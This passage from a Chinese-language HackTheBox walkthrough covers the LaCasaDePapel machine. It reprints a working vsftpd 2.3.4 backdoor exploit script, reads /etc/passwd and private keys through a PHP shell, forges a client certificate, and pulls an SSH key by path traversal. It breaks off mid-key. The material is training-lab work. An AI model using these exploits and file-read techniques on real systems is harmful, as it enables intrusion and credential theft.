throw-up   Throw an exception or error out of the Psy Shell.                                                           \n  timeit     Profiles with a timer.                                                                                      \n  trace      Show the current call stack.                                                                                \n  buffer     Show (or clear) the contents of the code input buffer.                       Aliases: buf                   \n  clear      Clear the Psy Shell screen.                                                                                 \n  edit       Open an external editor. Afterwards, get produced code in input buffer.                                     \n  sudo       Evaluate PHP code, bypassing visibility restrictions.                                                       \n  history    Show the Psy Shell history.                                                  Aliases: hist                  \n  exit       End the current session and return to caller.                                Aliases: quit, q\n```\n似乎是一个 shell\n\n这里我有点感兴趣，去再次扫描一下这个端口试试\n\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# nmap -vvv -p6200 10.10.10.131                        \nStarting Nmap 7.93 ( https://nmap.org ) at 2023-01-09 04:39 CST\nInitiating Ping Scan at 04:39\nScanning 10.10.10.131 [4 ports]\nCompleted Ping Scan at 04:39, 0.43s elapsed (1 total hosts)\nInitiating Parallel DNS resolution of 1 host. at 04:39\nCompleted Parallel DNS resolution of 1 host. at 04:39, 0.01s elapsed\nDNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]\nInitiating SYN Stealth Scan at 04:39\nScanning 10.10.10.131 [1 port]\nDiscovered open port 6200/tcp on 10.10.10.131\nCompleted SYN Stealth Scan at 04:39, 0.45s elapsed (1 total ports)\nNmap scan report for 10.10.10.131\nHost is up, received syn-ack ttl 63 (0.39s latency).\nScanned at 2023-01-09 04:39:23 CST for 1s\n\nPORT     STATE SERVICE REASON\n6200/tcp open  lm-x    syn-ack ttl 63\n\nRead data files from: /usr/bin/../share/nmap\nNmap done: 1 IP address (1 host up) scanned in 0.99 seconds\n           Raw packets sent: 5 (196B) | Rcvd: 5 (196B)\n```\n再次扫描显示的却是 open，那证明之前的脚本对这台服务器做了什么，去把机器还原一下，然后再去看看漏洞详情\n\n```bash\n# Exploit Title: vsftpd 2.3.4 - Backdoor Command Execution\n# Date: 9-04-2021\n# Exploit Author: HerculesRD\n# Software Link: http://www.linuxfromscratch.org/~thomasp/blfs-book-xsl/server/vsftpd.html\n# Version: vsftpd 2.3.4\n# Tested on: debian\n# CVE : CVE-2011-2523\n\n#!/usr/bin/python3\n\nfrom telnetlib import Telnet\nimport argparse\nfrom signal import signal, SIGINT\nfrom sys import exit\n\ndef handler(signal_received, frame):\n    # Handle any cleanup here\n    print('   [+]Exiting...')\n    exit(0)\n\nsignal(SIGINT, handler)\nparser=argparse.ArgumentParser()\nparser.add_argument(\"host\", help=\"input the address of the vulnerable host\", type=str)\nargs = parser.parse_args()\nhost = args.host\nportFTP = 21 #if necessary edit this line\n\nuser=\"USER nergal:)\"\npassword=\"PASS pass\"\n\ntn=Telnet(host, portFTP)\ntn.read_until(b\"(vsFTPd 2.3.4)\") #if necessary, edit this line\ntn.write(user.encode('ascii') + b\"\\n\")\ntn.read_until(b\"password.\") #if necessary, edit this line\ntn.write(password.encode('ascii') + b\"\\n\")\n\ntn2=Telnet(host, 6200)\nprint('Success, shell opened')\nprint('Send `exit` to quit shell')\ntn2.interact()\n```\n这里是对 21 端口进行了登录，但是账号却是“:)”这么一个笑脸？等恢复好以后去尝试手动利用呢\n\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# nc 10.10.10.131 6200\n(UNKNOWN) [10.10.10.131] 6200 (?) : Connection refused\n```\n直接请求确实是不行的，所以一开始的扫描结果应该是正确的\n\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# ftp 10.10.10.131                                                                                                  \nConnected to 10.10.10.131.\n220 (vsFTPd 2.3.4)\nName (10.10.10.131:root): lucifiel:)\n331 Please specify the password.\nPassword: \n\n421 Service not available, remote server timed out. Connection closed.\nftp: Login failed\n```\n然后我们随便使用一个账号登录 ftp，将结果添加上 :) 笑脸就可以了\n\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# nmap -vvv -p6200 10.10.10.131                       \nStarting Nmap 7.93 ( https://nmap.org ) at 2023-01-09 04:44 CST\nInitiating Ping Scan at 04:44\nScanning 10.10.10.131 [4 ports]\nCompleted Ping Scan at 04:44, 0.42s elapsed (1 total hosts)\nInitiating Parallel DNS resolution of 1 host. at 04:44\nCompleted Parallel DNS resolution of 1 host. at 04:44, 0.01s elapsed\nDNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]\nInitiating SYN Stealth Scan at 04:44\nScanning 10.10.10.131 [1 port]\nDiscovered open port 6200/tcp on 10.10.10.131\nCompleted SYN Stealth Scan at 04:44, 0.44s elapsed (1 total ports)\nNmap scan report for 10.10.10.131\nHost is up, received echo-reply ttl 63 (0.39s latency).\nScanned at 2023-01-09 04:44:06 CST for 0s\n\nPORT     STATE SERVICE REASON\n6200/tcp open  lm-x    syn-ack ttl 63\n\nRead data files from: /usr/bin/../share/nmap\nNmap done: 1 IP address (1 host up) scanned in 0.97 seconds\n           Raw packets sent: 5 (196B) | Rcvd: 5 (196B)\n```\n然后再扫描就是显示 open\n\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# nc 10.10.10.131 6200\nPsy Shell v0.9.9 (PHP 7.2.10 — cli) by Justin Hileman\n```\n然后再连接就显示给了我们一个 php shell\n\n> [https://stackoverflow.com/questions/56910401/how-to-execute-system-commands-using-psysh-php](https://stackoverflow.com/questions/56910401/how-to-execute-system-commands-using-psysh-php)\n\n这里找到一篇参考文章，显示如果我们要使用这个 php shell 执行系统命令，那么我们可以使用反引号 \\` 来将要执行的指令给包起来，我们去尝试执行一下\n\n```bash\n`whoami`\nPHP Warning:  shell_exec() has been disabled for security reasons in phar://eval()'d code on line 1\n```\n这里提示错误，但是知道了执行我们命令的函数是 shell\\_exec()\n\n如果我们尝试自己构造命令呢？\n\n```bash\necho(\"I'm Lucifiel!\")\nI'm Lucifiel!⏎\nsystem(\"whoami\")\nPHP Fatal error:  Call to undefined function system() in Psy Shell code on line 1\nsystem(\"id\")\nPHP Fatal error:  Call to undefined function system() in Psy Shell code on line 1\n```\necho 被成功输出了，但是 shell 的似乎没有输出？所以我们需要尝试一下哪些函数可以被执行\n\n```php\nphphpinfo()\nphpinfo()\nPHP Version => 7.2.10\n\nSystem => Linux lacasadepapel 4.14.78-0-virt #1-Alpine SMP Tue Oct 23 11:43:38 UTC 2018 x86_64\nBuild Date => Sep 17 2018 09:23:43\n```\nphpinfo 可以被执行，也可以显示很多重要的信息，但是由于内容太多我就不全部贴上来了\n\n```php\ndisable_functions => exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source => exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source\n```\n我们这里可以看到，刚才尝试的部分函数已经被 php 禁用了\n\n去翻一下 php 函数吧，复习复习基本功\n\n> [https://www.runoob.com/php/php-ref-directory.html](https://www.runoob.com/php/php-ref-directory.html)\n\n还真找到一个，scandir() 函数，返回指定目录中的文件和目录的数组。\n\n```bash\nscandir(\".\")\n=> [\n     \".\",\n     \"..\",\n     \".DS_Store\",\n     \"._.DS_Store\",\n     \"bin\",\n     \"boot\",\n     \"dev\",\n     \"etc\",\n     \"home\",\n     \"lib\",\n     \"lost+found\",\n     \"media\",\n     \"mnt\",\n     \"opt\",\n     \"proc\",\n     \"root\",\n     \"run\",\n     \"sbin\",\n     \"srv\",\n     \"swap\",\n     \"sys\",\n     \"tmp\",\n     \"usr\",\n     \"var\",\n   ]\n```\n当前我们在根目录，而且 mac 用户看到 .DS\\_Store 应该能想到，这台是和 mac 进行过连接的\n\n```bash\nscandir(\"/home/\")\n=> [\n     \".\",\n     \"..\",\n     \"berlin\",\n     \"dali\",\n     \"nairobi\",\n     \"oslo\",\n     \"professor\",\n   ]\n```\n这里可以看到是有五个用户的\n\n```bash\nfile_get_contents(\"/etc/passwd\")\n=> \"\"\"\n   root:x:0:0:root:/root:/bin/ash\\n\n   bin:x:1:1:bin:/bin:/sbin/nologin\\n\n   daemon:x:2:2:daemon:/sbin:/sbin/nologin\\n\n   adm:x:3:4:adm:/var/adm:/sbin/nologin\\n\n   lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\\n\n   sync:x:5:0:sync:/sbin:/bin/sync\\n\n   shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\\n\n   halt:x:7:0:halt:/sbin:/sbin/halt\\n\n   mail:x:8:12:mail:/var/spool/mail:/sbin/nologin\\n\n   news:x:9:13:news:/usr/lib/news:/sbin/nologin\\n\n   uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin\\n\n   operator:x:11:0:operator:/root:/bin/sh\\n\n   man:x:13:15:man:/usr/man:/sbin/nologin\\n\n   postmaster:x:14:12:postmaster:/var/spool/mail:/sbin/nologin\\n\n   cron:x:16:16:cron:/var/spool/cron:/sbin/nologin\\n\n   ftp:x:21:21::/var/lib/ftp:/sbin/nologin\\n\n   sshd:x:22:22:sshd:/dev/null:/sbin/nologin\\n\n   at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin\\n\n   squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin\\n\n   xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin\\n\n   games:x:35:35:games:/usr/games:/sbin/nologin\\n\n   postgres:x:70:70::/var/lib/postgresql:/bin/sh\\n\n   cyrus:x:85:12::/usr/cyrus:/sbin/nologin\\n\n   vpopmail:x:89:89::/var/vpopmail:/sbin/nologin\\n\n   ntp:x:123:123:NTP:/var/empty:/sbin/nologin\\n\n   smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin\\n\n   guest:x:405:100:guest:/dev/null:/sbin/nologin\\n\n   nobody:x:65534:65534:nobody:/:/sbin/nologin\\n\n   chrony:x:100:101:chrony:/var/log/chrony:/sbin/nologin\\n\n   dali:x:1000:1000:dali,,,:/home/dali:/usr/bin/psysh\\n\n   berlin:x:1001:1001:berlin,,,:/home/berlin:/bin/ash\\n\n   professor:x:1002:1002:professor,,,:/home/professor:/bin/ash\\n\n   vsftp:x:101:21:vsftp:/var/lib/ftp:/sbin/nologin\\n\n   memcached:x:102:102:memcached:/home/memcached:/sbin/nologin\\n\n   \"\"\"\n```\n可以确定这几个用户不是都有 bash 权限的，我们去看看有没有权限获得某个的 ssh 密钥吧\n\n```bash\nscandir(\"/home/dali/.ssh\")\n=> [\n     \".\",\n     \"..\",\n     \"authorized_keys\",\n     \"known_hosts\",\n   ]\n```\n经过测试，只有 dali 的目录咱们有权限\n\n```bash\nfile_get_contents(\"/home/nairobi/ca.key\")\n=> \"\"\"\n   -----BEGIN PRIVATE KEY-----\\n\n   MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDPczpU3s4Pmwdb\\n\n   7MJsi//m8mm5rEkXcDmratVAk2pTWwWxudo/FFsWAC1zyFV4w2KLacIU7w8Yaz0/\\n\n   2m+jLx7wNH2SwFBjJeo5lnz+ux3HB+NhWC/5rdRsk07h71J3dvwYv7hcjPNKLcRl\\n\n   uXt2Ww6GXj4oHhwziE2ETkHgrxQp7jB8pL96SDIJFNEQ1Wqp3eLNnPPbfbLLMW8M\\n\n   YQ4UlXOaGUdXKmqx9L2spRURI8dzNoRCV3eS6lWu3+YGrC4p732yW5DM5Go7XEyp\\n\n   s2BvnlkPrq9AFKQ3Y/AF6JE8FE1d+daVrcaRpu6Sm73FH2j6Xu63Xc9d1D989+Us\\n\n   PCe7nAxnAgMBAAECggEAagfyQ5jR58YMX97GjSaNeKRkh4NYpIM25renIed3C/3V\\n\n   Dj75Hw6vc7JJiQlXLm9nOeynR33c0FVXrABg2R5niMy7djuXmuWxLxgM8UIAeU89\\n\n   1+50LwC7N3efdPmWw/rr5VZwy9U7MKnt3TSNtzPZW7JlwKmLLoe3Xy2EnGvAOaFZ\\n\n   /CAhn5+pxKVw5c2e1Syj9K23/BW6l3rQHBixq9Ir4/QCoDGEbZL17InuVyUQcrb+\\n\n   q0rLBKoXObe5esfBjQGHOdHnKPlLYyZCREQ8hclLMWlzgDLvA/8pxHMxkOW8k3Mr\\n\n   uaug9prjnu6nJ3v1ul42NqLgARMMmHejUPry/d4oYQKBgQDzB/gDfr1R5a2phBVd\\n\n   I0wlpDHVpi+K1JMZkayRVHh+sCg2NAIQgapvdrdxfNOmhP9+k3ue3BhfUweIL9Og\\n\n   7MrBhZIRJJMT4yx/2lIeiA1+oEwNdYlJKtlGOFE+T1npgCCGD4hpB+nXTu9Xw2bE\\n\n   G3uK1h6Vm12IyrRMgl/OAAZwEQKBgQDahTByV3DpOwBWC3Vfk6wqZKxLrMBxtDmn\\n\n   sqBjrd8pbpXRqj6zqIydjwSJaTLeY6Fq9XysI8U9C6U6sAkd+0PG6uhxdW4++mDH\\n                                                                                                                                              \n   CTbdwePMFbQb7aKiDFGTZ+xuL0qvHuFx3o0pH8jT91C75E30FRjGquxv+75hMi6Y\\n\n   sm7+mvMs9wKBgQCLJ3Pt5GLYgs818cgdxTkzkFlsgLRWJLN5f3y01g4MVCciKhNI\\n\n   ikYhfnM5CwVRInP8cMvmwRU/d5Ynd2MQkKTju+xP3oZMa9Yt+r7sdnBrobMKPdN2\\n\n   zo8L8vEp4VuVJGT6/efYY8yUGMFYmiy8exP5AfMPLJ+Y1J/58uiSVldZUQKBgBM/\\n\n   ukXIOBUDcoMh3UP/ESJm3dqIrCcX9iA0lvZQ4aCXsjDW61EOHtzeNUsZbjay1gxC\\n\n   9amAOSaoePSTfyoZ8R17oeAktQJtMcs2n5OnObbHjqcLJtFZfnIarHQETHLiqH9M\\n\n   WGjv+NPbLExwzwEaPqV5dvxiU6HiNsKSrT5WTed/AoGBAJ11zeAXtmZeuQ95eFbM\\n\n   7b75PUQYxXRrVNluzvwdHmZEnQsKucXJ6uZG9skiqDlslhYmdaOOmQajW3yS4TsR\\n\n   aRklful5+Z60JV/5t2Wt9gyHYZ6SYMzApUanVXaWCCNVoeq+yvzId0st2DRl83Vc\\n\n   53udBEzjt3WPqYGkkDknVhjD\\n\n   -----END PRIVATE KEY-----\\n\n   \"\"\"\n```\n我们在 nairobi 用户下发现了一个 ca.key 文件，里面有一段证书？还是密钥？说不好\n\n```bash\n   -----BEGIN PRIVATE KEY-----\\n\n   MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDPczpU3s4Pmwdb\\n\n   7MJsi//m8mm5rEkXcDmratVAk2pTWwWxudo/FFsWAC1zyFV4w2KLacIU7w8Yaz0/\\n\n   2m+jLx7wNH2SwFBjJeo5lnz+ux3HB+NhWC/5rdRsk07h71J3dvwYv7hcjPNKLcRl\\n\n   uXt2Ww6GXj4oHhwziE2ETkHgrxQp7jB8pL96SDIJFNEQ1Wqp3eLNnPPbfbLLMW8M\\n\n   YQ4UlXOaGUdXKmqx9L2spRURI8dzNoRCV3eS6lWu3+YGrC4p732yW5DM5Go7XEyp\\n\n   s2BvnlkPrq9AFKQ3Y/AF6JE8FE1d+daVrcaRpu6Sm73FH2j6Xu63Xc9d1D989+Us\\n\n   PCe7nAxnAgMBAAECggEAagfyQ5jR58YMX97GjSaNeKRkh4NYpIM25renIed3C/3V\\n\n   Dj75Hw6vc7JJiQlXLm9nOeynR33c0FVXrABg2R5niMy7djuXmuWxLxgM8UIAeU89\\n\n   1+50LwC7N3efdPmWw/rr5VZwy9U7MKnt3TSNtzPZW7JlwKmLLoe3Xy2EnGvAOaFZ\\n\n   /CAhn5+pxKVw5c2e1Syj9K23/BW6l3rQHBixq9Ir4/QCoDGEbZL17InuVyUQcrb+\\n\n   q0rLBKoXObe5esfBjQGHOdHnKPlLYyZCREQ8hclLMWlzgDLvA/8pxHMxkOW8k3Mr\\n\n   uaug9prjnu6nJ3v1ul42NqLgARMMmHejUPry/d4oYQKBgQDzB/gDfr1R5a2phBVd\\n\n   I0wlpDHVpi+K1JMZkayRVHh+sCg2NAIQgapvdrdxfNOmhP9+k3ue3BhfUweIL9Og\\n\n   7MrBhZIRJJMT4yx/2lIeiA1+oEwNdYlJKtlGOFE+T1npgCCGD4hpB+nXTu9Xw2bE\\n\n   G3uK1h6Vm12IyrRMgl/OAAZwEQKBgQDahTByV3DpOwBWC3Vfk6wqZKxLrMBxtDmn\\n\n   sqBjrd8pbpXRqj6zqIydjwSJaTLeY6Fq9XysI8U9C6U6sAkd+0PG6uhxdW4++mDH\\n                                                                                                                                              \n   CTbdwePMFbQb7aKiDFGTZ+xuL0qvHuFx3o0pH8jT91C75E30FRjGquxv+75hMi6Y\\n\n   sm7+mvMs9wKBgQCLJ3Pt5GLYgs818cgdxTkzkFlsgLRWJLN5f3y01g4MVCciKhNI\\n\n   ikYhfnM5CwVRInP8cMvmwRU/d5Ynd2MQkKTju+xP3oZMa9Yt+r7sdnBrobMKPdN2\\n\n   zo8L8vEp4VuVJGT6/efYY8yUGMFYmiy8exP5AfMPLJ+Y1J/58uiSVldZUQKBgBM/\\n\n   ukXIOBUDcoMh3UP/ESJm3dqIrCcX9iA0lvZQ4aCXsjDW61EOHtzeNUsZbjay1gxC\\n\n   9amAOSaoePSTfyoZ8R17oeAktQJtMcs2n5OnObbHjqcLJtFZfnIarHQETHLiqH9M\\n\n   WGjv+NPbLExwzwEaPqV5dvxiU6HiNsKSrT5WTed/AoGBAJ11zeAXtmZeuQ95eFbM\\n\n   7b75PUQYxXRrVNluzvwdHmZEnQsKucXJ6uZG9skiqDlslhYmdaOOmQajW3yS4TsR\\n\n   aRklful5+Z60JV/5t2Wt9gyHYZ6SYMzApUanVXaWCCNVoeq+yvzId0st2DRl83Vc\\n\n   53udBEzjt3WPqYGkkDknVhjD\\n\n   -----END PRIVATE KEY-----\\n\n```\n这样直接保存下来，格式真是相当的乱啊，稍微替换整理一下\n\n在 vim 中使用 `:%s/\\\\n//g/ ` 和 `:%s/ //g`就行替换\n\n得到了干净密钥\n\n```bash\n-----BEGINPRIVATEKEY-----\nMIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDPczpU3s4Pmwdb\n7MJsi//m8mm5rEkXcDmratVAk2pTWwWxudo/FFsWAC1zyFV4w2KLacIU7w8Yaz0/\n2m+jLx7wNH2SwFBjJeo5lnz+ux3HB+NhWC/5rdRsk07h71J3dvwYv7hcjPNKLcRl\nuXt2Ww6GXj4oHhwziE2ETkHgrxQp7jB8pL96SDIJFNEQ1Wqp3eLNnPPbfbLLMW8M\nYQ4UlXOaGUdXKmqx9L2spRURI8dzNoRCV3eS6lWu3+YGrC4p732yW5DM5Go7XEyp\ns2BvnlkPrq9AFKQ3Y/AF6JE8FE1d+daVrcaRpu6Sm73FH2j6Xu63Xc9d1D989+Us\nPCe7nAxnAgMBAAECggEAagfyQ5jR58YMX97GjSaNeKRkh4NYpIM25renIed3C/3V\nDj75Hw6vc7JJiQlXLm9nOeynR33c0FVXrABg2R5niMy7djuXmuWxLxgM8UIAeU89\n1+50LwC7N3efdPmWw/rr5VZwy9U7MKnt3TSNtzPZW7JlwKmLLoe3Xy2EnGvAOaFZ\n/CAhn5+pxKVw5c2e1Syj9K23/BW6l3rQHBixq9Ir4/QCoDGEbZL17InuVyUQcrb+\nq0rLBKoXObe5esfBjQGHOdHnKPlLYyZCREQ8hclLMWlzgDLvA/8pxHMxkOW8k3Mr\nuaug9prjnu6nJ3v1ul42NqLgARMMmHejUPry/d4oYQKBgQDzB/gDfr1R5a2phBVd\nI0wlpDHVpi+K1JMZkayRVHh+sCg2NAIQgapvdrdxfNOmhP9+k3ue3BhfUweIL9Og\n7MrBhZIRJJMT4yx/2lIeiA1+oEwNdYlJKtlGOFE+T1npgCCGD4hpB+nXTu9Xw2bE\nG3uK1h6Vm12IyrRMgl/OAAZwEQKBgQDahTByV3DpOwBWC3Vfk6wqZKxLrMBxtDmn\nsqBjrd8pbpXRqj6zqIydjwSJaTLeY6Fq9XysI8U9C6U6sAkd+0PG6uhxdW4++mDH\nCTbdwePMFbQb7aKiDFGTZ+xuL0qvHuFx3o0pH8jT91C75E30FRjGquxv+75hMi6Y\nsm7+mvMs9wKBgQCLJ3Pt5GLYgs818cgdxTkzkFlsgLRWJLN5f3y01g4MVCciKhNI\nikYhfnM5CwVRInP8cMvmwRU/d5Ynd2MQkKTju+xP3oZMa9Yt+r7sdnBrobMKPdN2\nzo8L8vEp4VuVJGT6/efYY8yUGMFYmiy8exP5AfMPLJ+Y1J/58uiSVldZUQKBgBM/\nukXIOBUDcoMh3UP/ESJm3dqIrCcX9iA0lvZQ4aCXsjDW61EOHtzeNUsZbjay1gxC\n9amAOSaoePSTfyoZ8R17oeAktQJtMcs2n5OnObbHjqcLJtFZfnIarHQETHLiqH9M\nWGjv+NPbLExwzwEaPqV5dvxiU6HiNsKSrT5WTed/AoGBAJ11zeAXtmZeuQ95eFbM\n7b75PUQYxXRrVNluzvwdHmZEnQsKucXJ6uZG9skiqDlslhYmdaOOmQajW3yS4TsR\naRklful5+Z60JV/5t2Wt9gyHYZ6SYMzApUanVXaWCCNVoeq+yvzId0st2DRl83Vc\n53udBEzjt3WPqYGkkDknVhjD\n-----ENDPRIVATEKEY-----\n```\n但是空格被我们删除完了，所以我们还需要修改一下\n\n```bash\n-----BEGIN PRIVATE KEY-----\nMIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDPczpU3s4Pmwdb\n7MJsi//m8mm5rEkXcDmratVAk2pTWwWxudo/FFsWAC1zyFV4w2KLacIU7w8Yaz0/\n2m+jLx7wNH2SwFBjJeo5lnz+ux3HB+NhWC/5rdRsk07h71J3dvwYv7hcjPNKLcRl\nuXt2Ww6GXj4oHhwziE2ETkHgrxQp7jB8pL96SDIJFNEQ1Wqp3eLNnPPbfbLLMW8M\nYQ4UlXOaGUdXKmqx9L2spRURI8dzNoRCV3eS6lWu3+YGrC4p732yW5DM5Go7XEyp\ns2BvnlkPrq9AFKQ3Y/AF6JE8FE1d+daVrcaRpu6Sm73FH2j6Xu63Xc9d1D989+Us\nPCe7nAxnAgMBAAECggEAagfyQ5jR58YMX97GjSaNeKRkh4NYpIM25renIed3C/3V\nDj75Hw6vc7JJiQlXLm9nOeynR33c0FVXrABg2R5niMy7djuXmuWxLxgM8UIAeU89\n1+50LwC7N3efdPmWw/rr5VZwy9U7MKnt3TSNtzPZW7JlwKmLLoe3Xy2EnGvAOaFZ\n/CAhn5+pxKVw5c2e1Syj9K23/BW6l3rQHBixq9Ir4/QCoDGEbZL17InuVyUQcrb+\nq0rLBKoXObe5esfBjQGHOdHnKPlLYyZCREQ8hclLMWlzgDLvA/8pxHMxkOW8k3Mr\nuaug9prjnu6nJ3v1ul42NqLgARMMmHejUPry/d4oYQKBgQDzB/gDfr1R5a2phBVd\nI0wlpDHVpi+K1JMZkayRVHh+sCg2NAIQgapvdrdxfNOmhP9+k3ue3BhfUweIL9Og\n7MrBhZIRJJMT4yx/2lIeiA1+oEwNdYlJKtlGOFE+T1npgCCGD4hpB+nXTu9Xw2bE\nG3uK1h6Vm12IyrRMgl/OAAZwEQKBgQDahTByV3DpOwBWC3Vfk6wqZKxLrMBxtDmn\nsqBjrd8pbpXRqj6zqIydjwSJaTLeY6Fq9XysI8U9C6U6sAkd+0PG6uhxdW4++mDH\nCTbdwePMFbQb7aKiDFGTZ+xuL0qvHuFx3o0pH8jT91C75E30FRjGquxv+75hMi6Y\nsm7+mvMs9wKBgQCLJ3Pt5GLYgs818cgdxTkzkFlsgLRWJLN5f3y01g4MVCciKhNI\nikYhfnM5CwVRInP8cMvmwRU/d5Ynd2MQkKTju+xP3oZMa9Yt+r7sdnBrobMKPdN2\nzo8L8vEp4VuVJGT6/efYY8yUGMFYmiy8exP5AfMPLJ+Y1J/58uiSVldZUQKBgBM/\nukXIOBUDcoMh3UP/ESJm3dqIrCcX9iA0lvZQ4aCXsjDW61EOHtzeNUsZbjay1gxC\n9amAOSaoePSTfyoZ8R17oeAktQJtMcs2n5OnObbHjqcLJtFZfnIarHQETHLiqH9M\nWGjv+NPbLExwzwEaPqV5dvxiU6HiNsKSrT5WTed/AoGBAJ11zeAXtmZeuQ95eFbM\n7b75PUQYxXRrVNluzvwdHmZEnQsKucXJ6uZG9skiqDlslhYmdaOOmQajW3yS4TsR\naRklful5+Z60JV/5t2Wt9gyHYZ6SYMzApUanVXaWCCNVoeq+yvzId0st2DRl83Vc\n53udBEzjt3WPqYGkkDknVhjD\n-----END PRIVATE KEY-----\n```\nok，这样才是一个完整正确的密钥\n\n然后我们去生成一个证书\n\n```bash\nopenssl req -new -key ca.key -out server.csr\nopenssl x509 -req -days 365 -in server.csr -signkey ca.key -out server.crt\nopenssl pkcs12 -export -in server.crt -inkey ca.key -out server.p12\n```\n内容可以随便填\n\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# openssl req -new -key ca.key -out server.csr\nYou are about to be asked to enter information that will be incorporated\ninto your certificate request.\nWhat you are about to enter is what is called a Distinguished Name or a DN.\nThere are quite a few fields but you can leave some blank\nFor some fields there will be a default value,\nIf you enter '.', the field will be left blank.\n-----\nCountry Name (2 letter code) [AU]:\nState or Province Name (full name) [Some-State]:\nLocality Name (eg, city) []:\nOrganization Name (eg, company) [Internet Widgits Pty Ltd]:\nOrganizational Unit Name (eg, section) []:\nCommon Name (e.g. server FQDN or YOUR name) []:\nEmail Address []:\n\nPlease enter the following 'extra' attributes\nto be sent with your certificate request\nA challenge password []:\nAn optional company name []:\n                                                                                                                                                                                                                   \n┌──(root㉿kali)-[~/Desktop]\n└─# openssl x509 -req -days 365 -in server.csr -signkey ca.key -out server.crt\nCertificate request self-signature ok\nsubject=C = AU, ST = Some-State, O = Internet Widgits Pty Ltd\n                                                                                                                                                                                                                   \n┌──(root㉿kali)-[~/Desktop]\n└─# openssl pkcs12 -export -in server.crt -inkey ca.key -out server.p12\nEnter Export Password:\nVerifying - Enter Export Password:\n```\nok，这样我们就生成了我们需要的证书\n\n然后我们去浏览器导入我们的 p12 证书\n\n![](Hackthebox-LaCasaDePapel/-wiD2gbXNCqNo5iOANVEAC7T-WwPSyqe_HJ9W92wN-s.png)\n\nok，成功导入后我们就可以访问了\n\n![](Hackthebox-LaCasaDePapel/KP-SZZ5BnZYYzlnFOVL0hgRE8Pi_qKsyRgEkiu6cx98.png)\n\n![](Hackthebox-LaCasaDePapel/9bXUELyCTkRNy_J_pavKmQaR-GOD8F69YOFbTzydsb4.png)\n\n鼠标放上去就可以看到左下角出现了 https://10.10.10.131/?path=SEASON-1\n\n这很明显有 lfi 了吧\n\n![](Hackthebox-LaCasaDePapel/Uxh-rQNITspoWqH8zp8-w1NMNr78MzJkzdbpjAj-V90.png)\n\n成功包含到目录，我们去尝试一下获取 ssh 的密钥\n\n![](Hackthebox-LaCasaDePapel/wO2r5A4NLWq8DLWv26i9xJCKMxhCyssLKFU5lO4p-pw.png)\n\n但是直接获取会出错，我们去看一下他的文件格式是怎样的\n\n![](Hackthebox-LaCasaDePapel/sDjgugciDRq_WY4nsyjF039vEQkzhdzmL3Oj92ig1j0.png)\n\n似乎是转换为 base64 的\n\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# echo U0VBU09OLTEvMDEuYXZp|base64 -d             \nSEASON-1/01.avi\n```\n是的，是 base64，那我们也把需要读取的文件名转换为 base64 就好了\n\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# echo -n ../.ssh/id_rsa|base64\nLi4vLnNzaC9pZF9yc2E=\n```\n然后再去读取\n\n```bash\nhttps://10.10.10.131/file/Li4vLnNzaC9pZF9yc2E=\n```\n```bash\n-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAgEAotH6Ygupi7JhjdbDXhg2f9xmzxaDNdxxEioAgH2GjUeUc4cJeTfU\n/yWg1vyx1dXqanfwAzYOQLUgO9/rDbI9y51rTQnLhHsp/iFiGdvDO5iZwLNrwmzVLxgGc+\nmNac3qxHcuHx7q+zQHB8NfU/qzyAL2/xsRkzBODRg21tsVqnTV83T8CFSBUO2jzitHFNjv\nYbacP+Jn9Q5Y2HRdE03DWnAJJ7zk4SWWicM3riuuYyeqV6OYKboHwi+FB94Yx1xaPFGP7T\n0jnBU3molURhKKolNqY78PE5qYplO/eO5H/7vKbrF7J5VtsVpvGQsmjqUhQK/GoYrMudIh\ncfQSMUnpgWXYtCnIpBa53aY/fl0XYpL9a1ZQh1iGm4oleVnZNvqMa4mb+8kC8k3WDmw9pq\n/W3eGVQ6Xeyj/4kUENe1Q8xj9BIXLZJwXYHtACLS4PaKZSRaFSjkc/26/T2958f2oBqJLf\n+oxiydgcTI2vC34OYwwS7cOcSsS4HivUC6K7oJJHw3nUNoA2ge3cwiO6bNHrEKMJWOrMpp\n9UH9BbQ/u7k5Ap7QF8yBfrdC64EAUzyZJXWde1NhSNjiI0rBqzCPZQGSOLEIFAwzU0bMIu\nJu4JIQOAH+3tfoh8ccUdNcmfH7LaT7pF3VYwyoPMowLpA8fG4FXGyvoyrfeTXC6GY0+1NV\nUAAAdQRqG3BkahtwYAAAAHc3NoLXJzYQAAAgEAotH6Ygupi7JhjdbDXhg2f9xmzxaDNdxx\nEioAgH2GjUeUc4cJeTfU/yWg1vyx1dXqanfwAzYOQLUgO9/rDbI9y51rTQnLhHsp/iFiGd\nvDO5iZwLNrwmzVLxgGc+mNac3qxHcuHx7q+zQHB8NfU/qzyAL2/xsRkzBODRg21tsVqnTV\n83T8CFSBUO2jzitHFNjvYbacP+Jn9Q5Y2HRdE03DWnAJJ7zk4SWWicM3riuuYyeqV6OYKb